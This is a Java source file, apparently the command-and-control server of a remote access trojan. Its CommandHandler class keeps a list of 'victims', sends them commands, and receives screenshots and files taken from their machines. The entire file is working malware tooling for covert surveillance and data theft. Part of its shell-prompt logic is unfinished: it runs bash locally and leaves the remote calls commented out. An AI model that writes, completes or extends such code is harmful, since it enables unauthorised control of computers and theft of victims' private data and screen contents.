package server;

import server.model.Victim;
import sun.misc.IOUtils;

import javax.imageio.ImageIO;
import java.awt.image.BufferedImage;
import java.io.*;
import java.util.List;
import java.util.Scanner;

public class CommandHandler {

    private Connection connection;

    public CommandHandler(Connection connection){
        this.connection = connection;
    }

    public int displayVictims(){
        List<Victim> victimList = connection.getVictimList();
        for (int i=0; i< victimList.size(); i++){
            Victim victim = victimList.get(i);
            System.out.println(String.format("[%d] %s",i, victim.getName()));
        }
        return victimList.size();
    }

    public Victim getVictim(int index){
        return index<connection.getVictimList().size() ? connection.getVictimList().get(index) : null;
    }

    public boolean removeVictim(Victim victim){
        return connection.removeVictim(victim);
    }

    public void sendCommand(Victim victim, String command) throws IOException {
        DataOutputStream dos = victim.getDataOutputStream();
        dos.writeUTF(command);
        dos.flush();
    }

    public void handleCommandPrompt() throws IOException {

        String dir = System.getProperty("user.dir");
        String dir_specifier = "";
        Scanner sc=new Scanner(System.in);
        String cmd =  "";
        ProcessBuilder builder;

        do {
            if(cmd.trim().startsWith("cd ")){
                dir_specifier = cmd.trim().replace("cd ", "").trim();
                System.out.println(dir_specifier);
            }
            builder = new ProcessBuilder("bash", "-c", cmd);
            builder.directory(new File("/home/"));
            builder.redirectErrorStream(true);
            Process p = builder.start();

            BufferedReader br2 = new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec("pwd").getInputStream()));
            System.out.println(br2.readLine());

            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line = "";
            StringBuffer sb = new StringBuffer("");
            while ((line = r.readLine())!=null) {
                System.out.println(line);
                /*
                if(cmd.startsWith("cd ") && line.equals(dir_specifier)) {
                    line = r.readLine();
                    dir = line;
                    System.out.println("# inw: "+line);
                }else {
                    sb.append(line + "\n");
                }

                 */
            }
            //dataOutputStream.writeUTF(sb.toString() + dir+">");
            System.out.print(sb.toString() + dir+">");
            //cmd = dataInputStream.readUTF();
            cmd = sc.nextLine();
            System.out.println("# cmd: " + cmd);

        }while (!cmd.equalsIgnoreCase("exit"));
    }

    public String getFeedBackFrom(Victim victim) throws IOException {
        return victim.getDataInputStream().readUTF();
    }

    public String saveScreenshot(Victim victim, String path) throws IOException {
        System.out.println("# Received image: " + victim.getDataInputStream());
        String name = "screenshot_" + System.currentTimeMillis() + ".png";
        File file = new File(path + File.separator + name);
        InputStream is = victim.getDataInputStream();
        BufferedImage image = ImageIO.read(is);
        ImageIO.write(image, "png", file);
        //is.close();
        return name;
    }

    public void saveFile(Victim victim, String path) throws IOException{
        File file = new File(path );
        InputStream is = new DataInputStream(victim.getSocket().getInputStream());
        OutputStream os = new FileOutputStream(file);
        int len = 0;
        byte[] bytes = new byte[is.available()];
        while ((len=is.read(bytes)) > 0){
            os.write(bytes, 0, len);
            System.out.print(".");
        }
        os.close();
        is.close();
        System.out.println("complete...");
    }
}
